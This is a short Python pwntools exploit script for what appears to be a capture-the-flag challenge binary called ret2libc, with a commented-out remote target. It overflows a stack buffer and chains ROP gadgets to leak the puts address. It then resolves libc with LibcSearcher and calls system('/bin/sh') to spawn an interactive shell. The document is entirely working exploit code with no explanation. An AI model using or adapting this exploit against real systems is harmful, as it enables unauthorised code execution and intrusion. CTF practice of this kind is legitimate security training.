from pwn import *
from LibcSearcher import *

sh = process('./ret2libc')
# sh = remote("node5.buuoj.cn", 27359)
elf = ELF('./ret2libc')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi = 0x400763
ret_addr = 0x400506
main_addr = 0x400698

payload1 = b'a'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
sh.sendlineafter(b'Show me your magic again', payload1)

leak = sh.recvuntil('\x7f')[-6:].ljust(8, b'\x00')
puts_addr = u64(leak)
print(f"puts_addr: {hex(puts_addr)}")

libc = LibcSearcher("puts", puts_addr)
libc.add_condition("puts", puts_addr)  
libc_base = puts_addr - libc.dump("puts")
system_addr = libc_base + libc.dump("system")
bin_sh_addr = libc_base + libc.dump("str_bin_sh")

print(f"libc_base: {hex(libc_base)}")
print(f"system_addr: {hex(system_addr)}")
print(f"bin_sh_addr: {hex(bin_sh_addr)}")

payload2 = b'a'*40 + p64(pop_rdi) + p64(bin_sh_addr) + p64(ret_addr) + p64(system_addr)
sh.sendline(payload2)
sh.interactive()